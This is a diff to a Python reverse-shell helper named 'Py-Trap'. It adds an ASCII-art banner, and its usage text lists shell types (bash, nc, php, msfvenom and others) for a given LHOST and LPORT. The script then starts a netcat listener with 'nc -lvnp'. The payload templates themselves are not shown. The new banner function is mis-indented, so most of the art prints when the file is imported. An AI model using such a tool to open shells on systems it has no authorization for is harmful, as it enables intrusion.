@@ -21,8 +21,6 @@ shells = {
 
 }
 
-#banner
-#def banner():
 
 
 #function for decode 
@@ -44,31 +42,57 @@ def decode():
                 print(colored(R_port,"white",attrs=['bold']))
 
 
+#banner
+def banner():
+        print("")
+print(colored("       ___ __","blue"))
+print(colored("     _{___{__}\ ","blue"))
+print(colored("    {_}      `\) ","blue"))
+print(colored("   {_}        `            _.-'''--.._  ","blue"))
+print(colored("   {_}                    //'.--.  \___`.  ","blue"))
+print(colored("    { }__,_.--~~~-~~~-~~-::.---. `-.\  `.)  ","blue"))
+print(colored("     `-.{_{_{_{_{_{_{_{_//  -- 8;=- `  ","blue"))
+print(colored("        `-:,_.:,_:,_:,.`\\._ ..'=- ,  ","blue"))
+print(colored("            // // // //`-.`\`   .-'/ ","blue"))
+print(colored("           << << << <<    \ `--'  /----) ","blue"))
+print(colored("            ^  ^  ^  ^     `-.....--''' ","blue"))
+
+print("██████╗ ██╗   ██╗  ████████╗██████╗  █████╗ ██████╗")
+print("██╔══██╗╚██╗ ██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗")
+print("██████╔╝ ╚████╔╝█████╗██║   ██████╔╝███████║██████╔╝")
+print("██╔═══╝   ╚██╔╝ ╚════╝██║   ██╔══██╗██╔══██║██╔═══╝")
+print("██║        ██║        ██║   ██║  ██║██║  ██║██║")
+print("╚═╝        ╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝")
+print(colored("By Anant","cyan",attrs=['reverse','blink']))
 
 #main
 if __name__ == "__main__":
     
     if len(sys.argv)==1:
+        banner()
         print("\033[1m"+"\033[91m"+"\n [-] You have to choose a option from the list: \n")
         print("\033[1m"+"\033[97m"+" python \n python3 \n bash \n ncat \n nc \n php \n perl  \n ruby \n msfvenom \n")
         print("\033[93m"+"\033[1m"+"[+] Example: python3 %s <shell> <LHOST> <LPORT>"%sys.argv[0])
         sys.exit(1)
 
     if len(sys.argv)==2:
+        banner()
         print("\033[1m"+"\033[91m"+"\n[-] May be you did not enter IP address and Port number : \n ")
         print('')
         print("\033[93m"+"\033[1m"+"[+] Example: %s <shell> <LHOST> <LPORT>"%sys.argv[0])
         sys.exit(1)
 
     if len(sys.argv)==3:
+        banner()
         print("\033[1m"+"\033[91m"+"\n[-] May be you did not enter port number [LPORT]: \n")
         print('')
         print("\033[1m"+"\033[93m"+"[+] Example: %s <shell> <LHOST> <LPORT>"%sys.argv[0])
         sys.exit(1)
 
-    #banner()
-    print(colored("welcome","red"))     
+    banner()
+         
     decode()
     print(colored("-"*63+"[listening start on"+" --> "+ str(sys.argv[2])+":" + str(sys.argv[3])+"]"+"-"*63,"yellow",attrs=['bold']))
     print('\n')
     subprocess.run(["/usr/bin/nc","-lvnp",sys.argv[3]])
+
